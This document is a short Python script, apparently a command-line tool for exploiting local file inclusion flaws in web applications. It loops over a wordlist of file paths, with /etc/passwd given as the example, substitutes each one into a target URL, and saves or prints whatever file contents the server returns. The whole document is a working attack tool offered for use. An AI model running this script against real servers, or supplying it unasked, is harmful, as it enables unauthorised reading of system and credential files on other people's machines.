import sys
from argparse import ArgumentParser
import requests
from urllib.request import urlopen


def vrfy_args():
    try:
        open(args.list)
    except Exception as e:
        print("Unable to open the file " + args.list)
        sys.exit()

def exploit_LFI():
    url = args.url
    f = open(args.list)
    for line in f.readlines():
        url_var = url.replace('LFI', line)
        page = urlopen(url_var)
        content = page.read()
        if len(content) > 0:
            if args.dest == None:
                print("Result for => " + line + "\n" + content.decode("utf-8") + "\n")
            else:
                with open(args.dest, 'a') as f:
                    f.write("Result for => " + line + "\n" + content.decode("utf-8") + "\n")
                    f.close()


if __name__ == '__main__':
    p = ArgumentParser()
    p.add_argument('-w', '--wordlist', dest='list',
                   help='Wordlist containing files to test with LFI (example: /etc/passwd)', required=True)
    p.add_argument('-u', '--url', dest='url', help='The path to the LFI exploit example: http://localhost?file=LFI',
                   required=True)
    p.add_argument('-o', '--outfile', dest='dest', help='Output file to write all informations found', required=False)
    args = p.parse_args()

    vrfy_args()
    exploit_LFI()
